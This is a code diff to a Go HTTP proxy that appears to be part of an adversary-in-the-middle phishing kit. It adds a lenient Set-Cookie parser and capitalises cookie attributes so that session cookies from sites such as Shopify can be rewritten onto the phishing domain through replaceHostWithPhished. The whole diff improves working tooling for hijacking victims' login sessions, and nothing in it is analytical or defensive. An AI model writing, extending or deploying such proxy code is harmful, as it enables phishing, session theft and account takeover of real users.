@@ -1433,23 +1433,30 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				// 解析 cookie（http.ParseCookie 返回切片）
 				parsedCookies, err := http.ParseCookie(rawCookie)
 				if err != nil {
-					log.Debug("COOKIE_PARSE_FAILED: %v", err)
-					log.Debug("COOKIE_PARSE_FAILED raw: %s", rawCookie)
-					// 解析失败时，对原始 Set-Cookie 字符串做 domain 替换
-					modified := rawCookie
-					// 提取 Domain 属性值（不区分大小写，支持 Domain= 和 domain=）
-					domainMatch := regexp.MustCompile(`(?i)(;\s*[Dd]omain=)([^;]+)`)
-					if matches := domainMatch.FindStringSubmatch(rawCookie); len(matches) == 3 {
-						origDomain := strings.TrimSpace(matches[2])
-						phishDomain, ok := p.replaceHostWithPhished(origDomain)
-						if ok && phishDomain != origDomain {
-							modified = strings.Replace(rawCookie, matches[1]+matches[2], matches[1]+phishDomain, 1)
-							log.Debug("COOKIE_DOMAIN_REPLACED: %s -> %s", origDomain, phishDomain)
+					log.Debug("COOKIE_PARSE_FAILED: %v, trying loose parser", err)
+					// 使用宽松的解析器
+					ck, err := parseCookieLoose(rawCookie)
+					if err != nil {
+						log.Debug("COOKIE_LOOSE_PARSE_FAILED: %v", err)
+						// 解析失败时，对原始 Set-Cookie 字符串做 domain 替换
+						modified := rawCookie
+						// 提取 Domain 属性值（不区分大小写，支持 Domain= 和 domain=）
+						// 匹配 ; domain=xxx 或 ; Domain=xxx
+						domainMatch := regexp.MustCompile(`(?i)(;\s*domain=)([^;]+)`)
+						if matches := domainMatch.FindStringSubmatch(rawCookie); len(matches) == 3 {
+							origDomain := strings.TrimSpace(matches[2])
+							phishDomain, ok := p.replaceHostWithPhished(origDomain)
+							if ok && phishDomain != origDomain {
+								modified = strings.Replace(rawCookie, matches[1]+matches[2], matches[1]+phishDomain, 1)
+								log.Debug("COOKIE_DOMAIN_REPLACED: %s -> %s", origDomain, phishDomain)
+							}
 						}
+						log.Debug("COOKIE_FINAL: %s", modified)
+						resp.Header.Add("Set-Cookie", modified)
+						continue
 					}
-					log.Debug("COOKIE_FINAL: %s", modified)
-					resp.Header.Add("Set-Cookie", modified)
-					continue
+					// 成功解析，创建单元素切片
+					parsedCookies = []*http.Cookie{ck}
 				}
 
 				for _, ck := range parsedCookies {
@@ -2686,6 +2693,100 @@ func (p *HttpProxy) replaceHostWithOriginal(hostname string) (string, bool) {
 	return hostname, false
 }
 
+// parseCookieLoose 宽松地解析 Set-Cookie 字符串
+// Go 的 http.ParseCookie 对 cookie 值有严格限制，不接受某些特殊字符（如 :）
+// 这个函数更宽松，能处理 Shopify 等网站的非标准 cookie
+func parseCookieLoose(setCookie string) (*http.Cookie, error) {
+	// 找到第一个分号，分割 cookie 值和属性
+	parts := strings.SplitN(setCookie, ";", 2)
+	if len(parts) == 0 {
+		return nil, fmt.Errorf("empty cookie")
+	}
+
+	// 解析 cookie 名称和值
+	nameValue := strings.TrimSpace(parts[0])
+	eqIdx := strings.Index(nameValue, "=")
+	if eqIdx < 0 {
+		return nil, fmt.Errorf("no = in cookie")
+	}
+
+	name := nameValue[:eqIdx]
+	value := nameValue[eqIdx+1:]
+
+	ck := &http.Cookie{
+		Name:  name,
+		Value: value,
+	}
+
+	// 解析属性
+	if len(parts) > 1 {
+		attrs := strings.Split(parts[1], ";")
+		for _, attr := range attrs {
+			attr = strings.TrimSpace(attr)
+			if attr == "" {
+				continue
+			}
+
+			// 分割属性名和值
+			attrParts := strings.SplitN(attr, "=", 2)
+			attrName := strings.ToLower(strings.TrimSpace(attrParts[0]))
+
+			switch attrName {
+			case "domain":
+				if len(attrParts) == 2 {
+					ck.Domain = strings.TrimSpace(attrParts[1])
+				}
+			case "path":
+				if len(attrParts) == 2 {
+					ck.Path = strings.TrimSpace(attrParts[1])
+				}
+			case "expires":
+				if len(attrParts) == 2 {
+					expiresStr := strings.TrimSpace(attrParts[1])
+					// 移除引号
+					expiresStr = strings.Trim(expiresStr, `"`)
+					ck.RawExpires = expiresStr
+					// 尝试多种时间格式
+					for _, format := range []string{
+						time.RFC1123,
+						time.RFC850,
+						time.ANSIC,
+						"Monday, 02-Jan-2006 15:04:05 MST",
+					} {
+						if t, err := time.Parse(format, expiresStr); err == nil {
+							ck.Expires = t
+							break
+						}
+					}
+				}
+			case "max-age":
+				if len(attrParts) == 2 {
+					if age, err := strconv.Atoi(strings.TrimSpace(attrParts[1])); err == nil {
+						ck.MaxAge = age
+					}
+				}
+			case "secure":
+				ck.Secure = true
+			case "httponly":
+				ck.HttpOnly = true
+			case "samesite":
+				if len(attrParts) == 2 {
+					switch strings.ToLower(strings.TrimSpace(attrParts[1])) {
+					case "lax":
+						ck.SameSite = http.SameSiteLaxMode
+					case "strict":
+						ck.SameSite = http.SameSiteStrictMode
+					case "none":
+						ck.SameSite = http.SameSiteNoneMode
+					}
+				}
+			}
+		}
+	}
+
+	return ck, nil
+}
+
 // mergeSplitCookies 合并分离的 cookie 属性（Shopify 等网站可能返回格式不标准的 Set-Cookie）
 // 例如：set-cookie: _shopify_y=xxx\nset-cookie: domain=strapya.store\nset-cookie: path=/
 // 需要合并为：_shopify_y=xxx; Domain=strapya.store; Path=/
@@ -2756,7 +2857,28 @@ func (p *HttpProxy) mergeSplitCookies(rawCookies []string) []string {
 		merged = append(merged, currentCookie)
 	}
 
-	return merged
+	// 标准化属性名：把小写的 domain=, path= 等转换为首字母大写
+	// 因为 http.ParseCookie 只认识首字母大写的属性名
+	standardized := make([]string, len(merged))
+	for i, cookie := range merged {
+		// 匹配 ; domain=xxx 或 ; path=xxx 等
+		for attr := range cookieAttrs {
+			// 替换 ; attr= 为 ; Attr=
+			pattern := regexp.MustCompile(`(?i)(;\s*)` + attr + `(=)`)
+			standardized[i] = pattern.ReplaceAllStringFunc(cookie, func(s string) string {
+				// 找到属性名并首字母大写
+				matches := pattern.FindStringSubmatch(s)
+				if len(matches) == 3 {
+					attrName := strings.ToUpper(attr[:1]) + attr[1:]
+					return matches[1] + attrName + matches[2]
+				}
+				return s
+			})
+			cookie = standardized[i]
+		}
+	}
+
+	return standardized
 }
 
 func (p *HttpProxy) replaceHostWithPhished(hostname string) (string, bool) {
